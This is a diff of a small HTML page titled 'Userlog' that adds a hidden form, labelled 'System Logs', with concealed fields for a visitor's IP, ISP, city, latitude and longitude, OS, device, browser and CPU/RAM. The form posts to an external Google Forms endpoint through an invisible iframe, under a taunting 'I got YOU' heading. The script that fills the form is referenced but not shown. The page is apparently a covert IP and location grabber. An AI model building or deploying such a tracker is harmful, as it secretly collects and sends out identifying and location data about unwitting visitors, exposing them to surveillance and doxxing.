@@ -1,28 +1,42 @@
 <html>
+
 <head>
   <title>Userlog</title>
 </head>
+
 <body>
-  <h5 id="ipinfo"></h5>
-  <h5 id="useragent"></h5>
+  <h5 id="ipinfo">I got YOU</h5>
+
+<!-- System Logs -->
+<div>
+  <script type="text/javascript">var submitted = false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"
+    onload="if(submitted)  {window.location='index.html';}"></iframe>
+  <form name="LogForm"
+    action="https://docs.google.com/forms/d/e/1FAIpQLSe5oyqKn0Es0H8uPOBu4PKQg-cmGC3I-t1PapbLhPBCuENuiw/formResponse"
+    method="post" target="hidden_iframe" onsubmit="submitted=true;">
+    <input id="LFpage" style="display:none;" type="text" name="entry.1020860759" value="">
+    <input id="LFip" style="display:none;" type="text" name="entry.755470913" value="">
+    <input id="LFisporg" style="display:none;" type="text" name="entry.414523074" value="">
+    <input id="LFloc" style="display:none;" type="text" name="entry.1844426094" value="">
+    <input id="LFlat" style="display:none;" type="text" name="entry.751171197" value="">
+    <input id="LFlon" style="display:none;" type="text" name="entry.2113023836" value="">
+    <input id="LFos" style="display:none;" type="text" name="entry.1219549028" value="">
+    <input id="LFdevice" style="display:none;" type="text" name="entry.1971368319" value="">
+    <input id="LFbrowser" style="display:none;" type="text" name="entry.667600438" value="">
+    <input id="LFramcores" style="display:none;" type="text" name="entry.837615904" value="">
+
+    <!-- <input type="submit" value="Submit" /> -->
+  </form>
+</div>
+<!-- System Logs END -->
+
+
   <script src="js/vendor/jquery-2.2.4.min.js"></script>
-	<script src="js/superfish.min.js"></script>
-	<script src="js/jquery.magnific-popup.min.js"></script>
-	<script src="js/vendor/bootstrap.min.js"></script>
-  <script src="js/userlog.js"></script>
+  <script src="js/superfish.min.js"></script>
+  <script src="js/jquery.magnific-popup.min.js"></script>
+  <script src="js/vendor/bootstrap.min.js"></script>
+  <script src="js/systemlog.js"></script>
 </body>
 
-Page Title
-ip
-ISP
-ORG
-Lat
-Lon
-City
-postalcode
-country
-district
-OS
-Device name
-Browser
-RAM Processor cores
+
